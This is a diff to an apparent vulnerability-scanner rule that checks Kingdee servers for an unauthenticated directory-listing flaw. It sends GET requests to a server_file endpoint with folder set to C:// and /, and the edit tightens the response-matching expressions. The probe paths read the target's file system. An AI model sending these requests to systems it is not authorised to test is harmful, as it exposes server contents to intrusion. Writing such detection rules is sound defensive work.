@@ -7,13 +7,13 @@ rules:
       cache: true
       method: GET
       path: /appmonitor/protected/selector/server_file/files?folder=C://&suffix=
-    expression: response.status == 200 && response.body.bcontains(b"Windows") || response.body.bcontains(b"Users")
+    expression: response.status == 200 && "accept-charset" in response.headers && response.headers["content-type"].contains("json") && response.body.bcontains(b"Windows") && response.body.bcontains(b"Users")
   kingdee2:
     request:
       cache: true
       method: GET
       path: /appmonitor/protected/selector/server_file/files?folder=/&suffix=
-    expression: response.status == 200 && response.body.bcontains(b"etc") || response.body.bcontains(b"bin")
+    expression: response.status == 200 && "accept-charset" in response.headers && response.headers["content-type"].contains("json") && response.body.bcontains(b"/etc") && response.body.bcontains(b"/bin")
 expression: kingdee1() || kingdee2()
 detail:
   author: iak3ec(https://github.com/nu0l)
